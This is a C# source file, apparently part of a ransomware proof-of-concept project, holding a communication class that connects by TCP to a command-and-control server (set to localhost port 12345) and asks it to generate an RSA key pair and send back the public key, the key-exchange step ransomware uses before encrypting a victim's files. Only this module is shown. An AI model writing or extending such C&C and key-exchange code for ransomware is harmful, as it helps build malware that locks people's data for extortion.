using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Ilay_sRanomwarePoc
{
    class Communication
    {
        private const string CommandAndControlServerHostName = "localhost";
        private const string CommandAndControlServerAddress = "127.0.0.1";
        private const int CommandAndControlServerPort = 12345;
        private readonly IPEndPoint EndPoint;
        private readonly Socket CommmunicationSocket;

        public Communication()
        {
            //socket creation with the c&c server
            IPHostEntry host = Dns.GetHostEntry(CommandAndControlServerHostName);
            IPAddress ipAddress = host.AddressList[0];
            EndPoint = new IPEndPoint(ipAddress, CommandAndControlServerPort);
            CommmunicationSocket = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
        }
        public bool ConnectToCommandAndControl()
        {
            try
            {
                CommmunicationSocket.Connect(EndPoint);
                return true;
            }
            catch
            {
                Console.WriteLine("An Error while connecting to c&c");
                return false;

            }
        }

        public Byte[] ServerHello()//code 0=>tells the c&c server to generate apublic/private ras keys and returns the pubic one
        {
            Byte[] intBytes = BitConverter.GetBytes(0);
            Byte[] RsaPublicKey = new byte[1024];
            try
            {
                CommmunicationSocket.Send(intBytes);
                Thread.Sleep(10000);
                CommmunicationSocket.Receive(RsaPublicKey);
                return RsaPublicKey;

            }
            catch
            {

                Console.WriteLine("An Error when trying to retrive public key");
                return null;

            }


        }







    }
}
